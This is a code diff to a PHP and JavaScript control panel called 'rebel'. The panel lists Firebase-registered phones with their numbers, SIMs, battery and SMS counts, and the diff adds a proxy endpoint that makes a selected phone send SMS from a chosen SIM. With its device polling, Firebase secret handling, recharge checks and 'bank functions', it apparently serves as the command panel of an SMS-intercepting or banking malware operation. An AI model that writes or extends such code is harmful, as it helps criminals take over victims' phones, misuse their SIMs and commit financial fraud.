@@ -84,6 +84,31 @@ if (isset($_GET['rebel_auth']) || isset($_POST['rebel_auth'])) {
   rebel_json_out(['ok' => true, 'token' => $session['token'], 'expires' => $session['expires']]);
 }
 
+if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
+  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
+  if (!is_array($body)) {
+    $body = [];
+  }
+
+  $authData = rebel_keys_load();
+  $token = trim((string)($body['token'] ?? ''));
+  if ($token === '' || !rebel_session_valid($authData, $token)) {
+    rebel_json_out(['ok' => false, 'error' => 'Unauthorized — login again'], 401);
+  }
+
+  $deviceId = trim((string)($body['device_id'] ?? ''));
+  $to = trim((string)($body['to'] ?? ''));
+  $message = trim((string)($body['message'] ?? ''));
+  $sim = max(1, (int)($body['sim'] ?? 1));
+  $fbUrl = rtrim(trim((string)($body['database_url'] ?? '')), '/');
+  $fbKey = trim((string)($body['auth_key'] ?? ''));
+  $schema = strtolower(trim((string)($body['schema'] ?? 'rabel')));
+  $deviceNode = trim((string)($body['device_node'] ?? 'clients'));
+
+  $result = rebel_send_sms_to_device($fbUrl, $fbKey, $deviceId, $sim, $to, $message, $schema, $deviceNode);
+  rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
+}
+
 function rebel_avatar_url() {
   if (is_file(__DIR__ . '/assets/rebel-avatar.jpg')) return 'assets/rebel-avatar.jpg';
   if (is_file(__DIR__ . '/rebel-avatar.jpg')) return 'rebel-avatar.jpg';
@@ -449,7 +474,8 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 
 <script src="firebase_defaults.js"></script>
 <script>
-var AUTH_URL='phone.php?rebel_auth=1';
+var AUTH_URL='mobile.php?rebel_auth=1';
+var SEND_SMS_URL='mobile.php?rebel_send_sms=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
@@ -594,7 +620,8 @@ function processClientsData(){
     var on=resolveOnlineStatus(s,p.fbId);
     allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
       name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
-      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0});
+      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,
+      sims:extractDeviceSims(s)});
   });
   allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
   if(!selDev&&allDevs.length)selDev=allDevs[0].id;
@@ -672,10 +699,42 @@ function renderDeviceView(){
     '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
     '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
 }
+function extractDeviceSims(raw){
+  var sims=[],seen={},i,s,pn;
+  if(!raw||typeof raw!=='object')return sims;
+  var list=raw.sims;
+  if(list&&typeof list==='object'&&!Array.isArray(list))list=Object.keys(list).map(function(k){return list[k];});
+  if(Array.isArray(list)){
+    for(i=0;i<list.length;i++){
+      s=list[i];
+      if(typeof s==='string'&&s&&!seen[s]){seen[s]=1;sims.push({slot:i+1,phoneNumber:s});continue;}
+      if(!s||typeof s!=='object')continue;
+      pn=s.phoneNumber||s.number||s.phone||s.mobNo||s.mobile||'Unknown';
+      if(!seen[pn]){seen[pn]=1;sims.push({slot:i+1,phoneNumber:pn});}
+    }
+  }
+  if(!sims.length){
+    pn=getPhoneFromRecord(raw);
+    if(pn)sims.push({slot:1,phoneNumber:pn});
+  }
+  return sims;
+}
+function renderSimSelector(d){
+  var el=document.getElementById('simSelector');
+  if(!el)return;
+  var sims=(d&&d.sims&&d.sims.length)?d.sims:[{slot:1,phoneNumber:'SIM 1'},{slot:2,phoneNumber:'SIM 2'}];
+  _sendSimSlot=sims[0].slot||1;
+  el.innerHTML=sims.map(function(s,idx){
+    var slot=s.slot||idx+1;
+    var label='SIM '+slot+(s.phoneNumber&&s.phoneNumber!=='Unknown'?' · '+s.phoneNumber:'');
+    return '<div class="sim-chip'+(slot===_sendSimSlot?' active':'')+'" data-sim="'+slot+'" onclick="selectSim('+slot+',this)">'+esc(label)+'</div>';
+  }).join('');
+}
 function updateSendForm(){
   var d=getSelDev();
   document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
   document.getElementById('sendForm').classList.toggle('hidden',!d);
+  if(d)renderSimSelector(d);
 }
 
 function clearListeners(){
@@ -786,22 +845,46 @@ function selectSim(slot,btn){
   if(btn)btn.classList.add('active');
 }
 
-// ---- FIX: Send SMS with SIM selection ----
+// ---- Send SMS — rebel.py same logic (via PHP proxy + Firebase auth) ----
+function normalizePhone(raw){
+  var clean=String(raw||'').replace(/\D/g,'');
+  if(clean.length===10)return clean;
+  if(clean.length>10&&clean.indexOf('91')===0)return clean.slice(-10);
+  return clean;
+}
+function getFbAuthKey(inst){
+  if(!inst||!inst.config)return '';
+  var c=inst.config;
+  return c.secret||c.authKey||c.key||c.databaseSecret||'';
+}
+function sendSmsFetch(body){
+  var s=getSession();body=body||{};
+  if(s&&s.token)body.token=s.token;
+  var hdr={'Content-Type':'application/json'};
+  var apk=rebelApkHeaders();
+  for(var k in apk)hdr[k]=apk[k];
+  return fetch(SEND_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify(body)})
+    .then(function(r){return r.json().then(function(j){return{httpOk:r.ok,data:j};});});
+}
 function sendSms(){
   var d=getSelDev();if(!d){toast('Select a device first',false);return;}
-  var inst=getFbInstance(d.fbId),to=document.getElementById('sendTo').value.trim(),msg=document.getElementById('sendMsg').value.trim();
-  if(!to||!msg){toast('Fill number and message',false);return;}
+  var inst=getFbInstance(d.fbId);
+  if(!inst){toast('Firebase not loaded',false);return;}
+  var to=normalizePhone(document.getElementById('sendTo').value.trim());
+  var msg=document.getElementById('sendMsg').value.trim();
+  if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
+  if(!msg){toast('Enter message',false);return;}
   document.getElementById('sendStatus').textContent='Sending via SIM '+_sendSimSlot+'...';
-  var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
-  var payload={to:to,message:msg,from:_sendSimSlot,isSended:false};
-  if(inst.schema!=='rabel'){
-    path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
-    payload.sim=_sendSimSlot-1; // 0-based
-  }
-  fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
-    if(r.ok){document.getElementById('sendStatus').textContent='✅ Sent from SIM '+_sendSimSlot;document.getElementById('sendMsg').value='';toast('SMS sent',true);}
-    else{document.getElementById('sendStatus').textContent='❌ Failed';toast('Send failed',false);}
-  }).catch(function(){document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);});
+  sendSmsInternal(to,msg,_sendSimSlot,function(ok,data){
+    if(ok){
+      document.getElementById('sendStatus').textContent='✅ Sent from SIM '+_sendSimSlot;
+      document.getElementById('sendMsg').value='';
+      toast('SMS sent to device',true);
+    }else{
+      document.getElementById('sendStatus').textContent='❌ '+(data&&data.error||'Failed');
+      toast(data&&data.error||'Send failed',false);
+    }
+  });
 }
 
 // ---- FIX: Check Recharge (Ping) ----
@@ -816,18 +899,25 @@ function checkRecharge(){
   });
 }
 function sendSmsInternal(to, msg, simSlot, callback){
-  var d=getSelDev();if(!d){if(callback)callback(false);return;}
+  var d=getSelDev();if(!d){if(callback)callback(false,{error:'No device'});return;}
   var inst=getFbInstance(d.fbId);
-  var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
-  var payload={to:to,message:msg,from:simSlot||1,isSended:false};
-  if(inst.schema!=='rabel'){
-    path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
-    payload.sim=(simSlot||1)-1;
-  }
-  fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
-    if(r.ok){if(callback)callback(true);}
-    else{if(callback)callback(false);}
-  }).catch(function(){if(callback)callback(false);});
+  if(!inst){if(callback)callback(false,{error:'Firebase missing'});return;}
+  var phone=normalizePhone(to);
+  sendSmsFetch({
+    device_id:d.rawId,
+    to:phone,
+    message:msg,
+    sim:simSlot||1,
+    database_url:inst.restUrl,
+    auth_key:getFbAuthKey(inst),
+    schema:inst.schema||'rabel',
+    device_node:d.deviceNode||'clients'
+  }).then(function(res){
+    var ok=!!(res.httpOk&&res.data&&res.data.ok);
+    if(callback)callback(ok,res.data||{});
+  }).catch(function(){
+    if(callback)callback(false,{error:'Network error'});
+  });
 }
 
 // ─── BANK FUNCTIONS (Copied from laptop.php) ───
